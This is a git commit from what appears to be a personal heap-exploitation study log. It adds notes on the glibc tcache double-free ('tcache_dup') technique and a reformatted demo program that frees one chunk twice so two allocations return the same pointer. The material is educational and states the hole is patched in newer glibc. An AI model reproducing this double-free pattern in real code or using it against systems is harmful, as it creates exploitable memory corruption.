e93de219c035515b454abcc39c3b40469f9c22a9
LongChampion <ThePalazin@Gmail.com>
2020-03-21 18:18:37 +0700

    Learned tcache_dup

---
+++ MYLOG/tcache_dup.md
@@ -0,0 +1,20 @@
+# Tcache duplicate
+> LongChampion, 21/03/2020
+
+This attack work as `fastbin_dup`:
+```
+#include <stdlib.h>
+
+int main()
+{
+    void *a = malloc(0x100);
+    free(a);
+    free(a);
+    void *a1 = malloc(0x100);
+    void *a2 = malloc(0x100);
+}
+```
+Unlike fastbin, early version of tcache is lack of many security checks, include *double free checking*. So we even no need to free a temporary chunk to bypass this check (we can't bypass the check that don't exits).
+
+## Note
+Because the attack is very simple, it have been patched and no longer work against newer version of glibc.
--- glibc_2.26/tcache_dup.c
+++ glibc_2.26/tcache_dup.c
@@ -3,18 +3,18 @@
 
 int main()
 {
-	fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");
+    fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");
 
-	fprintf(stderr, "Allocating buffer.\n");
-	int *a = malloc(8);
+    fprintf(stderr, "Allocating buffer.\n");
+    int *a = malloc(8);
 
-	fprintf(stderr, "malloc(8): %p\n", a);
-	fprintf(stderr, "Freeing twice...\n");
-	free(a);
-	free(a);
+    fprintf(stderr, "malloc(8): %p\n", a);
+    fprintf(stderr, "Freeing twice...\n");
+    free(a);
+    free(a);
 
-	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
-	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
+    fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
+    fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
 
-	return 0;
+    return 0;
 }
